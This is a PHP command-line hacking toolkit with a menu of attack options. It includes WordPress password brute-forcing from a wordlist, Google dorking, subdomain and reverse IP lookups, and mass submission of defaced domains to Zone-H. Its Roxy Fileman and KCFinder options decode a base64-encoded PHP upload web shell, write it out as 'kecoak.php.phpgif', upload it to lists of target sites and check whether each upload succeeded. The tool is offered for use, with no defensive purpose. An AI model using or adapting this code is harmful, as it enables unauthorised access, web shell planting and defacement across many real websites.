#!/usr/bin/php
<?php
# THANKS TEGUH APRIANTO for API KEY CSE :V
error_reporting(0);
class Colors 
{
    ##SOURCE FOR THIS CLASS : https://www.if-not-true-then-false.com/2010/php-class-for-coloring-php-command-line-cli-scripts-output-php-output-colorizing-using-bash-shell-colors/
    private $foreground_colors = array();
    private $background_colors = array();
    public function __construct()
    {
        $this->foreground_colors['black'] = '0;30';
	    $this->foreground_colors['dark_gray'] = '1;30';
		$this->foreground_colors['blue'] = '0;34';
		$this->foreground_colors['light_blue'] = '1;34';
		$this->foreground_colors['green'] = '0;32';
		$this->foreground_colors['light_green'] = '1;32';
		$this->foreground_colors['cyan'] = '0;36';
		$this->foreground_colors['light_cyan'] = '1;36';
		$this->foreground_colors['red'] = '0;31';
		$this->foreground_colors['light_red'] = '1;31';
		$this->foreground_colors['purple'] = '0;35';
		$this->foreground_colors['light_purple'] = '1;35';
		$this->foreground_colors['brown'] = '0;33';
		$this->foreground_colors['yellow'] = '1;33';
		$this->foreground_colors['light_gray'] = '0;37';
		$this->foreground_colors['white'] = '1;37';

		$this->background_colors['black'] = '40';
		$this->background_colors['red'] = '41';
		$this->background_colors['green'] = '42';
		$this->background_colors['yellow'] = '43';
		$this->background_colors['blue'] = '44';
		$this->background_colors['magenta'] = '45';
		$this->background_colors['cyan'] = '46';
		$this->background_colors['light_gray'] = '47';
		}

	public function getColoredString($string, $foreground_color = null, $background_color = null)
	{
		$colored_string = "";

		if (isset($this->foreground_colors[$foreground_color])) {
			$colored_string .= "\033[" . $this->foreground_colors[$foreground_color] . "m";
		}
		if (isset($this->background_colors[$background_color])) {
			$colored_string .= "\033[" . $this->background_colors[$background_color] . "m";
		}

		$colored_string .=  $string . "\033[0m";

		return $colored_string;
	}

	public function getForegroundColors()
	{
		return array_keys($this->foreground_colors);
	}
	public function getBackgroundColors()
	{
		return array_keys($this->background_colors);
	}
}
class PlanTSecLibrary extends Colors
{
    var $ch;
    function getStr($string, $start, $end)
    {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
    function homeLah()
    {
        echo "
        __________.__              ____________________              
        \______   \  | _____    ___\__    ___/   _____/ ____   ____  
         |     ___/  | \__  \  /    \|    |  \_____  \_/ __ \_/ ___\ Author: Con7ext     
         |    |   |  |__/ __ \|   |  \    |  /        \  ___/\  \___ Ver   : V.1
         |____|   |____(____  /___|  /____| /_______  /\___  >\___  >
                            \/     \/               \/     \/     \/    
        [1] Wordpress Brute [2] Google Dorker [3] Subdomain Finder
        [4] Reverse IP      [5] Zone-h Poster [6] Alexa Rank
        [7] CSRF            [8] Roxy Fileman  [9] Kcfinder
        [99] Exit
        Please Choose >> ";
        $choice = trim(fgets(STDIN));
        echo "\n";
        if($choice == 1){
            system("clear");
            echo "[+]Wordpress Brute Force[+]\n\n";
            echo "Host: ";
            $hos = trim(fgets(STDIN));
            echo "User: ";
            $tim = trim(fgets(STDIN));
            echo "List: ";
            $wd = trim(fgets(STDIN));
            $load = file_get_contents($wd);
            $read = explode("\n", $load);
            foreach($read as $wordlist){
                $this->wpBrute($hos, $tim, $wordlist);
            }
            $this->backLah();
        }
        else if($choice == 2){
            system("clear");
            echo "[+] Google Dorking [+]\n\n";
            echo "Dork: ";
            $drk = trim(fgets(STDIN));
            $dork = urlencode($drk);
            $co = $this->makeRequest("https://cse.google.com/cse.js?cx=partner-pub-2698861478625135:3033704849", null, array("User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"));
            $cse_tok = $this->getStr($co, '"cse_token": "', '"');
            for($i = 1; $i <= 100; $i++){
                $au = $this->makeRequest("https://cse.google.com/cse/element/v1?num=10&hl=en&cx=partner-pub-2698861478625135:3033704849&safe=off&cse_tok=$cse_tok&start=$i&q=$dork&callback=x", null, array("User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"));
                preg_match_all("@\"unescapedUrl\": \"(.*?)\"@", $au, $ugh);
                if(preg_match("@\"unescapedUrl\"@", $au)){
                    foreach($ugh[1] as $url){
                        echo $url."\n";
                    }
                }
                else{
                    echo $this->getColoredString("I cant get url :D", "red") . "\n";
                    break;
                }
            }
            $this->backLah();
        }
        else if($choice == 3){
            system("clear");
            echo "[+] Subdomain Finder [+]\nPlease just put website without http/https\n\n";
            echo "Domain: ";
            $dom = trim(fgets(STDIN));
            $ehh = $this->makeRequest("https://www.virustotal.com/ui/domains/$dom/subdomains", null, array("x-session-hash: 16961ee14a95fae7bbfe69587dcca2adf647b7022e88ec6167edec568e4c69d3"));
            preg_match_all("@\"id\": \"(.*?)\"@", $ehh, $pew);
            if(preg_match("@\"id\": \"@", $ehh)){
                foreach($pew[1] as $subdo){
                    echo $subdo."\n";
                }
            }
            else{
                echo $this->getColoredString("Not Found :D", "red") . "\n";
            }
            $this->backLah();
            
        }
        else if($choice == 4){
            system("clear");
            echo "[+] Reverse Ip Lookup [+]\nPlease put website without http/https\n\n";
            echo "Ip/Domain: ";
            $web = trim(fgets(STDIN));
            $ih = "theinput=$web&thetest=reverseiplookup&name_of_nonce_field=3020dad9e2&_wp_http_referer=%2Freverse-ip-lookup%2F";
            $ugh = $this->makeRequest("https://hackertarget.com/reverse-ip-lookup/", $ih, array("User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"));
            $eg = $this->getStr($ugh, '<pre id="formResponse">', '</pre>');
            if(preg_match("@<pre id=\"formResponse\">@", $ugh)){
                echo $eg."\n";
            }
            else{
                echo $this->getColoredString("Failed to reverse", "red") . "\n";
            }
        }
        else if($choice == 5){
            system("clear");
            echo "[+] Zone H Mass Poster [+]\n\n";
            echo "Nick: ";
            $nick = trim(fgets(STDIN));
            echo "List: ";
            $lst = trim(fgets(STDIN));
            $read = file_get_contents($lst);
            $line = explode("\n", $read);
            echo "Archive: http://www.zone-h.org/archive/notifier=$nick\n";
            echo "Onhold : http://www.zone-h.org/archive/notifier=$nick/published=0\n";
            foreach($line as $hexel){
                $ugh = $this->makeRequest("http://www.zone-h.com/notify/single", "defacer=$nick&domain1=$hexel&hackmode=1&reason=1&submit=Send", array("User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"));
                if(preg_match("@color=\"red\">OK<\/font>@", $ugh)){
                    echo $this->getColoredString("$hexel -> OK", "green") . "\n";
                }
                else{
                    echo $this->getColoredString("$hexel -> Error", "red") . "\n";
                }
            }
            $this->backLah();
        }
        else if($choice == 6){
            system("clear");
            echo "[+] Alexa Mass Check [+]\n\n";
            echo "List: ";
            $list = trim(fgets(STDIN));
            $read = file_get_contents($list);
            $ikem = explode("\n", $read);
            foreach($ikem as $url){
                $ugh = $this->makeRequest("http://data.alexa.com/data?cli=10&dat=snbamz&url=$url", null, array("User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"));
                preg_match_all("@<POPULARITY URL=\"(.*?)\" TEXT=\"(.*?)\"@", $ugh, $apalah);
                preg_match_all("@<COUNTRY CODE=\"(.*?)\" NAME=\"(.*?)\" RANK=\"(.*?)\"@", $ugh, $country);
                if(preg_match("@<POPULARITY@", $ugh)){
                    echo "Domain        : $url\n";
                    echo "Global Rank   : ".$apalah[2][0]."\n";
                    echo "Local Rank    : ".$country[3][0]."\n";
                    echo "Country       : ".$country[2][0]."\n";
                    echo "Country Code  : ".$country[1][0]."\n\n";
                }
                else{
                    echo "Domain        : $url\n";
                    echo "Global Rank   : -\n";
                    echo "Local Rank    : -\n";
                    echo "Country       : -\n";
                    echo "Country Code  : -\n\n";
                }
            }
            $this->backLah();
        }
        else if($choice == 7){
            system("clear");
            echo "[+] CSRF [+]\nPlease upload file in same folder with this file\n\n";
            echo "Web : ";
            $web = trim(fgets(STDIN));
            echo "Post: ";
            $post = trim(fgets(STDIN));
            echo "File: ";
            $file = trim(fgets(STDIN));
            $ugh = $this->makeRequest($web, array("$post" => "@$file"), null);
            echo $ugh."\n";
            $this->backLah();
        }
        else if($choice == 8){
            system("clear");
            echo "[+] Roxy Fileman Mass [+]\nPlease put complite url with exploit etc : website/php/Upload.php\n\n";
            $upload = base64_decode("PD9waHAgaWYoaXNzZXQoJF9GSUxFU1sna29udG9sJ11bJ25hbWUnXSkpeyRuYW1lID0gJF9GSUxFU1sna29udG9sJ11bJ25hbWUnXTskYmFuZ3NhdCA9ICRfRklMRVNbJ2tvbnRvbCddWyd0bXBfbmFtZSddO0Btb3ZlX3VwbG9hZGVkX2ZpbGUoJGJhbmdzYXQsICRuYW1lKTsgZWNobyAkbmFtZTt9ZWxzZXsgZWNobyAiPGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPjxpbnB1dCB0eXBlPWZpbGUgbmFtZT1rb250b2w+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSc+Pj4nPiI7DQp9IA0KPz4=");
            $shell = "kecoak.php.phpgif";
            $fopen = fopen($shell, "w");
            fwrite($fopen, $upload);
            fclose($fopen);
            echo "List: ";
            $list = trim(fgets(STDIN));
            $read = file_get_contents($list);
            $ughg = explode("\n", $read);
            foreach($ughg as $url){
                $target = $url;
                $br = str_replace("php/upload.php", "Uploads/", $url);
                $data = array(
                "files[]" => "@$shell"
                );
                $ugh = $this->makeRequest($target, $data);
                if($ugh){
                    $ngecheck = @file_get_contents("$br/$shell");
                    if(preg_match("@>>>@", $ngecheck)){
                        echo $this->getColoredString("$br/$shell Success Upload Shell:D", "green") . "\n";
                    }
                    else{
                        echo $this->getColoredString("$br/$shell Failed", "red") . "\n";
                    }
                }
            }
            $this->backLah();
        }
        else if($choice == 9){
            system("clear");
            echo "[+] Kcfinder Mass Exploit [+]\nPlease put website with complite exploit :D\n\n";
            $upload = base64_decode("PD9waHAgaWYoaXNzZXQoJF9GSUxFU1sna29udG9sJ11bJ25hbWUnXSkpeyRuYW1lID0gJF9GSUxFU1sna29udG9sJ11bJ25hbWUnXTskYmFuZ3NhdCA9ICRfRklMRVNbJ2tvbnRvbCddWyd0bXBfbmFtZSddO0Btb3ZlX3VwbG9hZGVkX2ZpbGUoJGJhbmdzYXQsICRuYW1lKTsgZWNobyAkbmFtZTt9ZWxzZXsgZWNobyAiPGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPjxpbnB1dCB0eXBlPWZpbGUgbmFtZT1rb250b2w+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSc+Pj4nPiI7DQp9IA0KPz4=");
            $shell = "kecoak.php.phpgif";
            $fopen = fopen($shell, "w");
            fwrite($fopen, $upload);
            fclose($fopen);
            echo "List: ";
            $list = trim(fgets(STDIN));
            $read = file_get_contents($list);
            $ughg = explode("\n", $read);
            foreach($ughg as $url){
                $target = $url;
                $br = str_replace("upload.php", "uploads/", $url);
                $data = array(
                "Filedata" => "@$shell"
                );
                $ugh = $this->makeRequest($target, $data);
                if($ugh){
                    $ngecheck = @file_get_contents("$br/files/$shell");
                    if(preg_match("@>>>@", $ngecheck)){
                        echo $this->getColoredString("$br/files/$shell Success Upload Shell:D", "green") . "\n";
                    }
                    else{
                        echo $this->getColoredString("$br/files/$shell Failed", "red") . "\n";
                    }
                }
            }
            $this->backLah();
        }
        else if($choice == 99){
            echo "Thanks For using my tools :D";
            exit;
        }
        else{
            echo "Please choose 1 - 9 :| or 99 for exit";
            $this->backLah();
        }
    }
    function backLah()
    {
        echo "Back or exit y/n ? ";
        $choice = trim(fgets(STDIN));
        if($choice == "y" or $choice == "Y")
        {
            system("clear");
            $this->homeLah();
        }
        else if($choice == "n" or $choice == "N")
        {
            exit;
        }
        else
        {
            echo "Please enter y / n :D";
            $this->backLah();
        }
    }
    function makeRequestWP($url, $post = null, $header = null)
    {
        $this->ch = curl_init();
        curl_setopt($this->ch, CURLOPT_URL, $url);
        curl_setopt($this->curl, CURLOPT_CONNECTTIMEOUT, 10);
        if($post && !empty($post))
        {
            curl_setopt($this->ch, CURLOPT_POSTFIELDS, $post);
        }
        if($header && !empty($header))
        {
            curl_setopt($this->ch, CURLOPT_HTTPHEADER, $header);
        }
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, 0);
        $output = curl_exec($this->ch);
        $http = curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
        if($http == 302){
            echo $this->getColoredString("Success Try Login", "green") . "\n";
            exit;
        }
        else{
            echo $this->getColoredString("Failed", "red") . "\n";
        }
        curl_close($this->ch);
        
    }
    function makeRequest($url, $post = null, $header = null)
    {
        $this->ch = curl_init();
        curl_setopt($this->ch, CURLOPT_URL, $url);
        curl_setopt($this->curl, CURLOPT_CONNECTTIMEOUT, 10);
        if($post && !empty($post))
        {
            curl_setopt($this->ch, CURLOPT_POSTFIELDS, $post);
        }
        if($header && !empty($header))
        {
            curl_setopt($this->ch, CURLOPT_HTTPHEADER, $header);
        }
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, 0);
        $output = curl_exec($this->ch);
        curl_close($this->ch);
        return($output);
    }
    function saveFile($filename, $contents)
    {
        $save = fopen($filename, "a");
        fwrite($save, $contents."\n");
        fclose($save);
    }
    function wpBrute($url, $user, $password)
    {
        $uurl = $url;
        if(preg_match("@/wp-login.php@", $url)){
            return true;
        }
        else{
            $url = $url."/wp-login.php";
        }
        echo "Host: $uurl\n";
        echo "User: $user\n";
        echo "Pass: $password\n";
        $this->makeRequestWP($url, "log=$user&pwd=$password&wp-submit=Login&redirect_to=$uurl/wp-admin/", array("User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"));
    }
}
$lib = new PlanTSecLibrary();
$lib->homeLah();
